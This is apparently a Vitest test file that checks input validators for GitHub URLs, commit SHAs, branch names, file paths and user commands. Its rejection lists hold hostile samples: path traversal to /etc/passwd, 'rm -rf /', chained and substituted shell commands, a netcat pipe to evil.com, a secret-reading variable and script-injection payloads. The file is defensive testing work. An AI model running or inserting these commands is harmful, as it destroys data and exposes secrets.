/**
 * Tests for security validation functions
 * Follows TDD approach: comprehensive security boundary testing
 */

import { describe, expect, it } from "vitest";
import {
	validateBranchName,
	validateCommitSha,
	validateFilePath,
	validateGitHubUrl,
	validateUserCommand,
} from "../src/lib/security-validators.js";

describe("Security Validation", () => {
	describe("validateGitHubUrl", () => {
		it("accepts valid GitHub repository URLs", () => {
			const validUrls = [
				"https://github.com/user/repo",
				"https://github.com/user-name/repo-name",
				"https://github.com/user123/repo_name.test",
				"https://github.com/a/b",
				"https://github.com/user/repo?tab=readme",
				"https://github.com/user/repo?ref=main&path=src",
			];

			validUrls.forEach((url) => {
				const result = validateGitHubUrl(url);
				expect(result.valid).toBe(true);
				expect(result.error).toBeUndefined();
			});
		});

		it("rejects malicious GitHub URLs", () => {
			const maliciousUrls = [
				"https://github.com/../evil",
				"https://github.com/user/repo/../secrets",
				"https://github.com/user/repo//admin",
				"https://github.com/user/repo%2e%2e/admin",
				"http://github.com/user/repo", // HTTP not HTTPS
				"https://evil.com/github.com/user/repo",
				"https://github.com.evil.com/user/repo",
			];

			maliciousUrls.forEach((url) => {
				const result = validateGitHubUrl(url);
				expect(result.valid).toBe(false);
				expect(result.error).toBeDefined();
			});
		});

		it("rejects URLs that are too long", () => {
			const longUrl = `https://github.com/user/${"a".repeat(300)}`;
			const result = validateGitHubUrl(longUrl);

			expect(result.valid).toBe(false);
			expect(result.error).toContain("exceeds maximum length");
		});

		it("validates URL protocol and domain strictly", () => {
			const invalidUrls = [
				"http://github.com/user/repo",
				"https://gitlab.com/user/repo",
				"https://github.org/user/repo",
				"ftp://github.com/user/repo",
			];

			invalidUrls.forEach((url) => {
				const result = validateGitHubUrl(url);
				expect(result.valid).toBe(false);
			});
		});

		it("validates repository path format", () => {
			const invalidPaths = [
				"https://github.com/-invalid/repo",
				"https://github.com/user/-invalid",
				"https://github.com/user/repo-",
				"https://github.com/user/",
				"https://github.com//repo",
				"https://github.com/user/repo/extra/path",
			];

			invalidPaths.forEach((url) => {
				const result = validateGitHubUrl(url);
				expect(result.valid).toBe(false);
			});
		});

		it("validates query parameters safely", () => {
			const unsafeUrl = "https://github.com/user/repo?script=alert(1)";
			const result = validateGitHubUrl(unsafeUrl);

			expect(result.valid).toBe(false);
			expect(result.error).toContain("Unsafe query parameter");
		});
	});

	describe("validateCommitSha", () => {
		it("accepts valid commit SHAs", () => {
			const validShas = [
				"a1b2c3d4e5f6789012345678901234567890abcd",
				"ABCDEF1234567890abcdef1234567890ABCDEF12",
				"0123456789abcdef0123456789abcdef01234567",
			];

			validShas.forEach((sha) => {
				const result = validateCommitSha(sha);
				expect(result.valid).toBe(true);
				expect(result.error).toBeUndefined();
			});
		});

		it("rejects invalid commit SHAs", () => {
			const invalidShas = [
				"not-a-sha",
				"12345", // Too short
				"a1b2c3d4e5f6789012345678901234567890abcd1", // Too long
				"g1b2c3d4e5f6789012345678901234567890abcd", // Invalid character 'g'
				"", // Empty
				"a1b2c3d4-e5f6789012345678901234567890abcd", // Hyphen
			];

			invalidShas.forEach((sha) => {
				const result = validateCommitSha(sha);
				expect(result.valid).toBe(false);
				expect(result.error).toContain("Invalid SHA format");
			});
		});

		it("handles non-string input", () => {
			const result = validateCommitSha(123 as any);
			expect(result.valid).toBe(false);
			expect(result.error).toContain("SHA must be a string");
		});
	});

	describe("validateBranchName", () => {
		it("accepts valid branch names", () => {
			const validBranches = [
				"main",
				"feature/user-auth",
				"fix/bug-123",
				"release/v1.0.0",
				"user-feature",
				"test_branch",
			];

			validBranches.forEach((branch) => {
				const result = validateBranchName(branch);
				expect(result.valid).toBe(true);
				expect(result.error).toBeUndefined();
			});
		});

		it("rejects invalid branch names", () => {
			const invalidBranches = [
				".hidden", // Starts with dot
				"branch.", // Ends with dot
				"branch..name", // Consecutive dots
				"branch~1", // Tilde
				"branch^1", // Caret
				"branch:main", // Colon
				"branch?name", // Question mark
				"branch*", // Asterisk
				"branch[1]", // Brackets
				"branch/", // Ends with slash
				"branch//name", // Double slash
				"@{branch}", // Reference syntax
				"@", // Just @
				"branch.lock", // Ends with .lock
				"", // Empty
			];

			invalidBranches.forEach((branch) => {
				const result = validateBranchName(branch);
				expect(result.valid).toBe(false);
				expect(result.error).toBeDefined();
			});
		});

		it("rejects branch names that are too long", () => {
			const longBranch = "a".repeat(300);
			const result = validateBranchName(longBranch);

			expect(result.valid).toBe(false);
			expect(result.error).toContain("too long");
		});
	});

	describe("validateFilePath", () => {
		it("accepts valid file paths", () => {
			const validPaths = [
				"src/index.ts",
				"components/Button.tsx",
				"tests/unit/auth.test.js",
				"package.json",
				"README.md",
			];

			validPaths.forEach((path) => {
				const result = validateFilePath(path);
				expect(result.valid).toBe(true);
				expect(result.error).toBeUndefined();
			});
		});

		it("blocks path traversal attempts", () => {
			const maliciousPaths = [
				"../../../etc/passwd",
				"src/../../../secret",
				"path//with//double//slashes",
				"path\\with\\backslashes",
				"file\0injection",
			];

			maliciousPaths.forEach((path) => {
				const result = validateFilePath(path);
				expect(result.valid).toBe(false);
				expect(result.error).toBeDefined();
			});
		});

		it("blocks control characters", () => {
			const controlPath = "file\x01name";
			const result = validateFilePath(controlPath);

			expect(result.valid).toBe(false);
			expect(result.error).toContain("Control characters");
		});

		it("handles non-string input", () => {
			const result = validateFilePath(123 as any);
			expect(result.valid).toBe(false);
			expect(result.error).toContain("must be a string");
		});
	});

	describe("validateUserCommand", () => {
		it("accepts safe user commands", () => {
			const safeCommands = [
				"analyze frontend structure",
				"scaffold react component",
				"optimize performance",
				"generate tests",
			];

			safeCommands.forEach((command) => {
				const result = validateUserCommand(command);
				expect(result.valid).toBe(true);
				expect(result.error).toBeUndefined();
			});
		});

		it("blocks dangerous command patterns", () => {
			const dangerousCommands = [
				"rm -rf /",
				"cat /etc/passwd",
				"$(whoami)",
				"analyze; rm -rf /",
				"test | nc evil.com 80",
				"echo `id`",
				"${process.env.SECRET}",
				"<script>alert(1)</script>",
				"javascript:alert(1)",
				'onclick="alert(1)"',
			];

			dangerousCommands.forEach((command) => {
				const result = validateUserCommand(command);
				expect(result.valid).toBe(false);
				expect(result.error).toContain("dangerous command patterns");
			});
		});

		it("rejects commands that are too long", () => {
			const longCommand = "analyze ".repeat(100);
			const result = validateUserCommand(longCommand);

			expect(result.valid).toBe(false);
			expect(result.error).toContain("too long");
		});

		it("handles non-string input", () => {
			const result = validateUserCommand(null as any);
			expect(result.valid).toBe(false);
			expect(result.error).toContain("must be a string");
		});
	});
});
